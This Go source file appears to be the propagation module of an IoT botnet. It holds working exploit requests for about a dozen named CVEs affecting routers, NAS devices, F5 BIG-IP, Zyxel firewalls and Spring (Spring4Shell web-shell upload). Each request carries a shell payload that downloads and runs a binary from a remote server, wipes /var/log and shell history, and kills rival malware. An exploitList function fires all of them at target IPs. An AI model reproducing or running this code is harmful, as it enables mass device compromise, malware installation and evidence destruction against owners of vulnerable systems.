package lib

import (
	"encoding/json"
	"net/http"
	"strings"
	"time"
)

var server *string

func (b *Bot) inject(arch string, isExploit bool) string {
	if isExploit {
		b.password = "Infected by exploit"
	}
	if arch == "mips" {
		server = &b.mipsArch
	} else {
		server = &b.defaultArch
	}
	return "touch /var/tmp/" + fileName(false) + "; printf \"" + b.password + "\\n" + b.tempIP + " [" + arch + "]" + "\\n\" > /var/tmp/" + fileName(false) + "; rm -rf /var/log/; wget -O " + fileName(false) + " " + *server + " || curl -o " + fileName(false) + " " + *server + "; history -c; rm ~/.bash_history; killall i .i mozi.m Mozi.m mozi.a Mozi.a kaiten Nbrute minerd /bin/busybox; chmod 700 " + fileName(false) + "; ./" + fileName(false) + " &"
}

func (e *Exploit) setupExploit(ip string) (*http.Client, *http.Request) {
	httpClient, httpReq, _ := setupHTTP(e.exploitMethod, "http://"+ip+"/", e.exploitHeader, e.exploitBody)
	/*
		Default pre-setup header.
	*/
	httpReq.Header.Set("User-Agent", e.exploitAgent)
	httpReq.Header.Set("Accept", e.exploitAccept)
	httpReq.Header.Set("Content-Type", e.exploitContType)
	httpReq.Header.Set("Connection", e.exploitConnection)
	return httpClient, httpReq
}

func (b *Bot) selfRequest(exploit Exploit) *http.Request {
	_, selfReq := exploit.setupExploit(b.tempIP)
	return selfReq
}

func (b *Bot) exploitLauncher(exploit Exploit, exploitReq *http.Request) {
	if exploit.exploitName != "" {
		b.Report("Spraying " + exploit.exploitName + ": " + b.tempIP)
	}
	httpClient, _ := exploit.setupExploit(b.tempIP)
	httpClient.Do(exploitReq)
	time.Sleep(1 * time.Second) //Just carefully of server getting flood.
}

func (b *Bot) CVE_2014_8361() {
	e8361 := Exploit{
		exploitName:       "CVE-2014-8361",
		exploitMethod:     "POST",
		exploitHeader:     "picsdesc.xml",
		exploitBody:       strings.NewReader(string("<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"<http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping> xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`" + b.inject("mips", true) + "`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e8361.setupExploit(b.tempIP)
	newHeader.Header.Set("SOAPAction", "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping")
	b.exploitLauncher(e8361, newHeader)
}

func (b *Bot) CVE_2017_17215() {
	e17215 := Exploit{
		exploitName:       "CVE-2017-17215",
		exploitMethod:     "POST",
		exploitHeader:     "ctrlt/DeviceUpgrade_1",
		exploitBody:       strings.NewReader(string("<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"<s:Body><u:Upgrade> xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox " + b.inject("mips", true) + ")</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e17215.setupExploit(b.tempIP)
	newHeader.Header.Set("Authorization", "Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"")
	b.exploitLauncher(e17215, newHeader)
}

func (b *Bot) CVE_2020_10987() {
	e10987 := Exploit{
		exploitName:       "CVE-2020-10987",
		exploitMethod:     "GET",
		exploitHeader:     "goform/setUsbUnload/.js?deviceName=A;" + b.inject("default", true),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	b.exploitLauncher(e10987, b.selfRequest(e10987))
}

func (b *Bot) CVE_2020_25506() {
	e25506 := Exploit{
		exploitName:       "CVE-2020-25506",
		exploitMethod:     "POST",
		exploitHeader:     "cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`" + b.inject("default", true) + "`",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	b.exploitLauncher(e25506, b.selfRequest(e25506))
}

func (b *Bot) CVE_2021_35395() {
	e35395 := Exploit{
		exploitName:       "CVE-2021-35395",
		exploitMethod:     "POST",
		exploitHeader:     "goform/formWsc",
		exploitBody:       strings.NewReader(string("submit-url=%2Fwlwps.asp&resetUnCfg=0&peerPin=12345678;" + b.inject("default", true) + ";&setPIN=Start+PIN&configVxd=off&resetRptUnCfg=0&peerRptPin=")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	b.exploitLauncher(e35395, b.selfRequest(e35395))
}

func (b *Bot) CVE_2022_1388() {
	post1388, _ := json.Marshal(map[string]string{
		"command":     "run",
		"utilCmdArgs": "-c '" + b.inject("default", true) + "'",
	})
	e1388 := Exploit{
		exploitName:       "CVE-2022-1388",
		exploitMethod:     "POST",
		exploitHeader:     "mgmt/tm/util/bash",
		exploitBody:       convReader(post1388),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/json",
		exploitConnection: "keep-alive, X-F5-Auth-Token",
	}
	_, newHeader := e1388.setupExploit(b.tempIP)
	newHeader.Header.Set("X-F5-Auth-Token", "NeverGonnaGiveYouUpNeverGonnaLetYouDownNeverGonnaRunAroundAndDesertYou")
	newHeader.Header.Set("Authorization", "Basic YWRtaW46")
	b.exploitLauncher(e1388, newHeader)
}

func (b *Bot) CVE_2022_22965_sub() {
	e22965sub := Exploit{
		exploitName:       "",
		exploitMethod:     "POST",
		exploitHeader:     "stupidRumor_war/index",
		exploitBody:       strings.NewReader(string("class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=")),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e22965sub.setupExploit(b.tempIP)
	newHeader.Header.Set("suffix", "%>//")
	newHeader.Header.Set("c1", "Runtime")
	newHeader.Header.Set("c2", "<%")
	newHeader.Header.Set("DNT", "1")
	b.exploitLauncher(e22965sub, newHeader)
}

func (b *Bot) CVE_2022_22965_main() {
	e22965main := Exploit{
		exploitName:       "CVE-2022-22965",
		exploitMethod:     "GET",
		exploitHeader:     "stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=" + b.inject("default", true),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	b.exploitLauncher(e22965main, b.selfRequest(e22965main))
}

func (b *Bot) CVE_2022_25075() {
	e25075 := Exploit{
		exploitName:       "CVE-2022-25075",
		exploitMethod:     "GET",
		exploitHeader:     "cgi-bin/downloadFlile.cgi?payload=`" + b.inject("default", true) + "`",
		exploitAgent:      "007",
		exploitAccept:     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "keep-alive",
	}
	_, newHeader := e25075.setupExploit(b.tempIP)
	newHeader.Header.Set("Upgrade-Insecure-Requests", "1")
	newHeader.Header.Set("Cache-Control", "max-age=0")
	b.exploitLauncher(e25075, newHeader)
}

func (b *Bot) CVE_2022_26186() {
	e26186 := Exploit{
		exploitName:       "CVE-2022-26186",
		exploitMethod:     "POST",
		exploitHeader:     "cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;" + b.inject("default", true) + ";&filetype=sh",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	_, newHeader := e26186.setupExploit(b.tempIP)
	newHeader.Header.Set("Cookie", "SESSION_ID=2:1645507767:2")
	newHeader.Header.Set("Upgrade-Insecure-Requests", "1")
	b.exploitLauncher(e26186, newHeader)
}

func (b *Bot) CVE_2022_26210() {
	post26210, _ := json.Marshal(map[string]string{
		"topicurl":      "setting/setUpgradeFW",
		"FileName":      ";" + b.inject("default", true),
		"Flags":         "1",
		"ContentLength": "1",
	})
	e26210 := Exploit{
		exploitName:       "CVE-2022-26210",
		exploitMethod:     "POST",
		exploitHeader:     "cgi-bin/cstecgi.cgi",
		exploitBody:       convReader(post26210),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/json",
		exploitConnection: "close",
	}
	_, newHeader := e26210.setupExploit(b.tempIP)
	newHeader.Header.Set("X-Requested-With", "XMLHttpRequest")
	newHeader.Header.Set("Cookie", "SESSION_ID=2:1645507767:2")
	b.exploitLauncher(e26210, newHeader)
}

func (b *Bot) CVE_2022_30525() {
	post30525, _ := json.Marshal(map[string]string{
		"command":     "setWanPortSt",
		"proto":       "dhcp",
		"port":        "4",
		"vlan_tagged": "1",
		"vlanid":      "5",
		"mtu":         b.inject("default", true),
		"data":        "dota?",
	})
	e30525 := Exploit{
		exploitName:       "CVE-2022-30525",
		exploitMethod:     "POST",
		exploitHeader:     "ztp/cgi-bin/handler",
		exploitBody:       convReader(post30525),
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/json",
		exploitConnection: "close",
	}
	b.exploitLauncher(e30525, b.selfRequest(e30525))
}

func (b *Bot) CVE_2022_34538() {
	e34538 := Exploit{
		exploitName:       "CVE-2022-34538",
		exploitMethod:     "GET",
		exploitHeader:     "cgi-bin/admin/vca/bia/addacph.cgi?mod&event=a&id=1&pluginname=;" + b.inject("default", true) + ";&name=a&evt_id=a",
		exploitAgent:      "007",
		exploitAccept:     "*/*",
		exploitContType:   "application/x-www-form-urlencoded",
		exploitConnection: "close",
	}
	b.exploitLauncher(e34538, b.selfRequest(e34538))
}

func (b *Bot) exploitList() {
	b.CVE_2014_8361()
	b.CVE_2017_17215()
	b.CVE_2020_10987()
	b.CVE_2020_25506()
	b.CVE_2021_35395()
	b.CVE_2022_1388()
	func() {
		b.CVE_2022_22965_sub()  //Payload execution.
		b.CVE_2022_22965_main() //Command injection.
	}()
	b.CVE_2022_25075()
	b.CVE_2022_26186()
	b.CVE_2022_26210()
	b.CVE_2022_30525()
	b.CVE_2022_34538()
}
